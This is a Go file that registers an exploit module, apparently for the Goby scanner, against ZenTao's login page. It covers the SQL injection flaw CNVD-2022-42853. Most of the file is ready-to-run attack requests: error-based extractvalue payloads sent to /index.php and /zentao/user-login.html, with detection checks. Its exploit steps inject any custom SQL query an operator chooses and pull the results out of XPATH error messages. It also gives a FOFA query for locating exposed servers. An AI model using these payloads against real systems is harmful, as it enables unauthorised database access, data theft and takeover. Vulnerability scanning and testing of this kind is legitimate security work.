package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "ZenTao Project Management System /zentao/user-login.html SQL Injection Vulnerability(CNVD-2022-42853)",
    "Description": "<p>ZenTao Project Management System is an open-source project management tool. This vulnerability exists in the account parameter, allowing attackers to construct malicious SQL queries to exploit the vulnerability, obtain sensitive information from the database, and potentially take full control of the database.</p>",
    "Product": "ZenTao Project Management System",
    "Homepage": "https://www.zentao.net/",
    "DisclosureDate": "2024-12-19",
    "PostTime": "2024-12-19",
    "Author": "2826161446@qq.com",
    "FofaQuery": "body=\"/js/all.js?v=16.5\" && body=\"禅道\"",
    "GobyQuery": "body=\"/js/all.js?v=16.5\" && body=\"禅道\"",
    "Level": "2",
    "Impact": "<p>This vulnerability allows attackers to obtain sensitive data through SQL injection, potentially leading to data leakage, tampering, or full control of the database.</p>",
    "Recommendation": "<p>It is recommended to strictly filter and validate user input, use Prepared Statements or Parameterized Queries to prevent SQL injection attacks. Additionally, upgrade to the latest version of ZenTao Project Management System.</p>",
    "References": [
        "https://blog.csdn.net/qq_50854662/article/details/129038203"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "select database(),select version(),select user()",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "select database()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php?account=admin'+and+(select+extractvalue(1,concat(0x7e,(MD5(110)),0x7e)))-- b",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "XPATH syntax error: '~5f93f983524def3dca464469d2cf9f3'",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/zentao/user-login.html",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
                    "X-Requested-With": "XMLHttpRequest",
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
                },
                "data_type": "text",
                "data": "account=admin'+and+(select+extractvalue(1,concat(0x7e,(MD5(110)),0x7e)))#&password=c8d9309d25318986166f352377c4984e&passwordStrength=0&referer=%2Fzentao%2F&verifyRand=1453306018&keepLogin=0&captcha="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "XPATH syntax error: '~5f93f983524def3dca464469d2cf",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php?account=admin'+and+(select+extractvalue(1,concat(0x7e,concat%280x7e7e7e%2C%28{{{payload_encode}}}%29%2C0x7e7e7e%29,0x7e)))--+b",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "5f93f983524def3dca464469d2cf9f3",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|~~~~([^'][\\s\\S]*?)~~~~",
                "output|when|attackType=sqlpoint|{{{lastreq}}}"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/zentao/user-login.html",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
                    "X-Requested-With": "XMLHttpRequest",
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
                },
                "data_type": "text",
                "data": "account=admin'+and+(select+extractvalue(1,concat({{{payload}}})))#&password=c8d9309d25318986166f352377c4984e&passwordStrength=0&referer=%2Fzentao%2F&verifyRand=1453306018&keepLogin=0&captcha="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "2H1W"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        "CNVD-2022-42853"
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "禅道项目管理系统 /zentao/user-login.html SQL 注入漏洞（CNVD-2022-42853）",
            "Product": "禅道项目管理系统",
            "Description": "<p>禅道项目管理系统是一款开源的项目管理工具。该漏洞存在于 account 参数中，攻击者可以通过构造恶意的 SQL 查询语句，利用该漏洞获取数据库中的敏感信息，甚至可能导致数据库被完全控制。</p>",
            "Recommendation": "<p>建议对用户输入进行严格的过滤和校验，使用预编译语句（Prepared Statements）或参数化查询（Parameterized Queries）来防止SQL注入攻击。同时，建议升级到最新版本的禅道项目管理系统。</p>",
            "Impact": "<p>该漏洞允许攻击者通过SQL注入获取敏感数据，可能导致数据泄露、篡改或数据库被完全控制。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "ZenTao Project Management System /zentao/user-login.html SQL Injection Vulnerability(CNVD-2022-42853)",
            "Product": "ZenTao Project Management System",
            "Description": "<p>ZenTao Project Management System is an open-source project management tool. This vulnerability exists in the account parameter, allowing attackers to construct malicious SQL queries to exploit the vulnerability, obtain sensitive information from the database, and potentially take full control of the database.</p>",
            "Recommendation": "<p>It is recommended to strictly filter and validate user input, use Prepared Statements or Parameterized Queries to prevent SQL injection attacks. Additionally, upgrade to the latest version of ZenTao Project Management System.</p>",
            "Impact": "<p>This vulnerability allows attackers to obtain sensitive data through SQL injection, potentially leading to data leakage, tampering, or full control of the database.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}",
        "payload_encode": "define|query_encode|{{{payload}}}"
    },
    "VariablesOrder": [
        "payload",
        "payload_encode"
    ],
    "EditType": "fast",
    "PocId": "9978"
}`
  
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
